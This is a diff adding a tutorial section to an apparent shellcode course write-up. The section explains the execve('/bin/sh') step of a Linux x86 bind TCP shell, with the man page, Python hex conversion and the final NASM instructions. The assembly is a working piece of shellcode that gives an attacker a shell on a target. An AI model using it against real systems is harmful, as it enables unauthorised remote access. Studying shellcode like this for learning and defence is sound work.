@@ -537,7 +537,99 @@ Whilst the zero flag is not set (JNZ) - the counter register is decremented each
 #### 6th Syscall (Execute /bin/sh using Execve) 
 ------
 
-asfds
+The final syscall instructs the program to execute the execve syscall which essentially points to '/bin/sh'. 
+
+The execve syscall is defined by the man pages as follows:
+
+```bash
+man execve
+
+EXECVE(2)                              Linux Programmer's Manual                             EXECVE(2)
+
+NAME
+       execve - execute program
+
+SYNOPSIS
+       #include <unistd.h>
+
+       int execve(const char *filename, char *const argv[],
+                  char *const envp[]);
+
+DESCRIPTION
+       execve()  executes  the  program pointed to by filename.  filename must be either a binary exe-
+       cutable, or a script starting with a line of the form:
+
+           #! interpreter [optional-arg]
+
+       For details of the latter case, see "Interpreter scripts" below.
+
+       argv is an array of argument strings passed to the new program.  By convention,  the  first  of
+       these  strings should contain the filename associated with the file being executed.  envp is an
+       array of strings, conventionally of the form key=value, which are passed as environment to  the
+       new program.  Both argv and envp must be terminated by a NULL pointer.  The argument vector and
+       environment can be accessed by the called program's main function, when it is defined as:
+
+           int main(int argc, char *argv[], char *envp[])
+```
+
+This objective is achieved when a connection is made to the newly created bind port, in turn excuting an interactive shell for an attacker on the target machine.
+
+This instuction set will load the string '/bin/sh' onto the stack in reverse order since the stack grows from high to low memory.
+
+The execve syscall works with null pointers and terminators, which requires a terminator to be placed onto the stack after clearing the EAX register and setting to '0':
+
+```nasm
+	xor eax, eax	; clear register, place execve
+	push eax	; terminator placed onto the stack with value of 0
+```
+
+Before placing the string '/bin/sh' onto the stack (reverse order), it is important to remember to avoid Null Bytes and add padding where possible in the shellcode. 
+
+To ensure that the string is divisible by 4, an additional character '/' is added to increase the characters from 7 to 8 resulting in '//bin/sh'.
+
+Python can be used to extract the hex address, along with splitting up the string into 4 byte halves to have a clean hex address to use for the calls:
+
+```python
+osboxes@osboxes:~/Downloads/SLAE$ python
+Python 2.7.3 (default, Feb 27 2014, 20:00:17) 
+[GCC 4.6.3] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> a = '//bin/sh'
+>>> a[::-1]
+'hs/nib//'
+>>> import binascii
+>>> binascii.hexlify(b'hs/n')
+'68732f6e'
+>>> binascii.hexlify(b'ib//')
+'69622f2f'
+>>> 
+```
+
+After the null has been pushed to the stack to null terminate the '//bin/sh argument', the hex values for '//bin/sh' can then be pushed onto the stack (reverse order):
+
+```nasm
+	push  0x68732f2f ; push the end of "//bin/sh", 'hs/n'
+	push  0x6e69622f ; push the beginning of "//bin/sh", 'ib//'
+```
+
+The execve syscall and the the exit syscall are executed to initiate the program and finally create the full bind TCP shell on the target machine.
+
+Final section 6 code ...
+
+```nasm
+	xor eax, eax
+	push eax
+	push 0x68732f6e
+	push 0x69622f2f
+	mov ebx, esp	; '//bin/sh', null terminated
+	push eax
+	mov edx, esp
+	push ebx
+	mov ecx, esp
+	mov al, 0x0b
+
+  	int 0x80
+```
 
 #### Assembly Code
 -------------
